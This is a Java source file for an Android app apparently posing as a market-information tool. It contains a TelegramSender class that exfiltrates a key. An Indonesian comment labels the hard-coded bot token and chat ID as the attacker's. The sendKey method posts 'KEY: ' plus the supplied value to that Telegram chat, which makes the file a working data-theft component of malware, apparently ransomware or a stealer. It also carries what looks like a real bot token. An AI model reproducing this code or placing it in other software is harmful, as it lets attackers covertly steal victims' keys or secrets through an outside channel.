package com.informasipasar.app;

import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TelegramSender {
    private static final String TAG = "TelegramSender";

    // Ganti dengan token bot dan chat id milik attacker
    private static final String BOT_TOKEN = "8539992688:AAEuPMyOXEweuaaHebCjGqsnMdeucQFKXhA";
    private static final String CHAT_ID = "8275632263";

    public static void sendKey(String key) {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            String body = "chat_id=" + CHAT_ID + "&text=" +
                    java.net.URLEncoder.encode("KEY: " + key, StandardCharsets.UTF_8.name());
            OutputStream os = conn.getOutputStream();
            os.write(body.getBytes(StandardCharsets.UTF_8));
            os.flush();
            os.close();
            int code = conn.getResponseCode();
            Log.d(TAG, "Telegram response: " + code);
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Failed to send key", e);
        }
    }
}
